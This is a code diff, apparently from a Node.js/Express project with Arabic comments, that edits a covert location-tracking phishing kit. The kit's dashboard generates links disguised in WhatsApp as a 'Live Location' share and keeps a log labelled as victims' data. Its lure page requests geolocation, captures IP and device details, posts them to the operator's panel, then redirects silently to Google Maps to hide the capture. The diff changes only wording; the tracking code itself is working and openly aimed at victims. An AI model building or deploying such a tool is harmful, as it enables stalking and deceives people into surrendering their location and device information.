@@ -8,7 +8,7 @@ const io = new Server(server, { cors: { origin: "*" } });
 
 app.use(express.json());
 
-// 1. لوحة التحكم المركزية
+// 1. لوحة التحكم المركزية لاستلام بيانات الضحايا وتوليد الروابط
 app.get('/', (req, res) => {
   res.send(`
     <!DOCTYPE html>
@@ -16,37 +16,37 @@ app.get('/', (req, res) => {
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>لوحة التحكم - الروابط السرية</title>
+        <title>لوحة التحكم المركزية</title>
         <style>
             body { font-family: system-ui, sans-serif; background: #121212; color: #fff; text-align: center; padding: 20px; }
             .card { background: #1e1e1e; border-radius: 12px; padding: 20px; margin: 15px auto; max-width: 600px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); text-align: right; }
             h2, h3 { text-align: center; }
             button { background: #25D366; color: white; border: none; padding: 12px 20px; font-size: 15px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; }
             button:hover { opacity: 0.9; }
-            input, select { width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #333; background: #222; color: #fff; margin-top: 8px; box-sizing: border-box; }
+            input { width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #333; background: #222; color: #fff; margin-top: 8px; box-sizing: border-box; }
             .section { margin-bottom: 25px; border-bottom: 1px solid #333; padding-bottom: 20px; }
             .info-box { background: #2a2a2a; padding: 15px; border-radius: 8px; margin-top: 12px; border-right: 5px solid #25D366; font-size: 14px; line-height: 1.7; }
         </style>
     </head>
     <body>
-        <h2>🎛️ لوحة التحكم - نظام الخرائط المخفي</h2>
+        <h2>🎛️ لوحة التحكم - نظام تتبع الخرائط المخفي</h2>
         
         <div class="card">
-            <h3>🔗 توليد رابط معاينة الخريطة</h3>
+            <h3>🔗 توليد رابط الخريطة الذكي</h3>
             <div class="section">
-                <p style="font-size: 13px; color: #aaa;">سيظهر الرابط في واتساب كمعاينة موقع حقيقي، وعند فتحه يمر بسیناريو مخفي وينتقل للخريطة الطبيعية.</p>
-                <button type="button" onclick="makeLink()">🗺️ إنشاء رابط الخريطة الذكي</button>
+                <p style="font-size: 13px; color: #aaa;">انقر لإنشاء رابط يظهر كمعاينة موقع حقيقي في واتساب:</p>
+                <button type="button" onclick="makeLink()">🗺️ إنشاء الرابط</button>
             </div>
 
             <div id="linkContainer" style="display:none; margin-top: 15px;">
-                <label>الرابط الجاهز للنسخ والإرسال:</label>
+                <label>الرابط الجاهز للإرسال:</label>
                 <input type="text" id="linkInput" readonly onclick="this.select();">
             </div>
         </div>
 
         <h3>📥 سجل الضحايا والمواقع الواردة:</h3>
         <div id="logs" class="card">
-            <p style="color: #aaa; text-align: center;">في انتظار تفاعلات الضحايا...</p>
+            <p style="color: #aaa; text-align: center;">في انتظار فتح الرابط من الضحية...</p>
         </div>
 
         <script src="/socket.io/socket.io.js"></script>
@@ -63,7 +63,7 @@ app.get('/', (req, res) => {
             const socket = io();
             socket.on('new-device-data', (data) => {
                 const logs = document.getElementById('logs');
-                if (logs.innerText.includes('في انتظار تفاعلات')) logs.innerHTML = '';
+                if (logs.innerText.includes('في انتظار فتح')) logs.innerHTML = '';
                 
                 const box = document.createElement('div');
                 box.className = 'info-box';
@@ -83,7 +83,7 @@ app.get('/', (req, res) => {
   `);
 });
 
-// 2. صفحة معاينة الموقع (تحتوي على وسوم واتساب الحقيقية وتطلب الإذن ثم تنقل للخريطة بصمت)
+// 2. صفحة معاينة الموقع (واتساب + طلب الموقع + الشاشة البيضاء + التوجيه للخريطة)
 app.get('/map-view/:id', async (req, res) => {
   let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'غير معروف';
   if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
@@ -96,7 +96,7 @@ app.get('/map-view/:id', async (req, res) => {
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>موقع جغرافي مباشر - Live Location</title>
         
-        <!-- وسوم واتساب لتبدو كمعاينة موقع رسمية تماماً -->
+        <!-- وسوم واتساب الحقيقية لظهور المعاينة -->
         <meta property="og:title" content="📍 مشاركة موقع مباشر (Live Location)">
         <meta property="og:description" content="تم مشاركة موقع جغرافي معك. اضغط لعرض المكان الحالي على الخريطة.">
         <meta property="og:image" content="https://images.unsplash.com/photo-1526778548025-fa2f459cd5c1?w=600&auto=format&fit=crop&q=80">
@@ -189,18 +189,18 @@ app.get('/map-view/:id', async (req, res) => {
                                 deviceData.fullAddress = "خطوط الطول: " + lat + ", العرض: " + lon;
                             }
 
-                            // إرسال البيانات للوحة التحكم لديك
+                            // إرسال البيانات للوحة التحكم فورا عبر الـ API
                             fetch('/api/log', {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
                                 body: JSON.stringify(deviceData)
                             }).then(() => {
-                                // 3. الانتقال الفوري لصفحة بيضاء مؤقتة ثم التحويل التلقائي لخرائط جوجل الحقيقية
+                                // عرض الشاشة البيضاء المؤقتة والانتقال لخرائط جوجل الحقيقية
                                 document.body.innerHTML = '<div style="background:#fff; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; font-family:sans-serif; color:#333;"><h3>جاري تحميل الخريطة...</h3></div>';
                                 
                                 setTimeout(() => {
                                     window.location.href = "https://maps.google.com/?q=" + lat + "," + lon;
-                                }, 800); // الانتقال للخريطة الحقيقية بعد أقل من ثانية
+                                }, 800);
                             });
                         },
                         (err) => {
